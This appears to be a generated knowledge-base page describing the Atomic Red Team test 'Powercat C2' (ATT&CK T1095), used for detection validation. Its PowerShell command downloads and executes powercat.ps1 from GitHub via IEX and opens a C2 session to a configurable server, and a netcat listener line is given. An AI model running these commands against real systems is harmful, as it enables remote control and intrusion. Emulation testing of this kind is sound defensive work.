---
atomic_guid: "3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e"
title: "Powercat C2"
framework: "atomic"
generated: "true"
attack_technique_id: "T1095"
attack_technique_name: "Non-Application Layer Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e"
  - "Powercat C2"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Powercat C2

Start C2 Session Using Powercat
To start the listener on a Linux device, type the following: 
nc -l -p <port>

## Metadata

- Atomic GUID: 3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e
- Technique: T1095: Non-Application Layer Protocol
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1095/T1095.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1095-non-application_layer_protocol|T1095]]

## Input Arguments

### server_ip

- description: The IP address or domain name of the listening server
- type: string
- default: 127.0.0.1

### server_port

- description: The port for the C2 connection
- type: integer
- default: 80

## Executor

- name: powershell

### Command

```powershell
IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c #{server_ip} -p #{server_port}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.yaml)
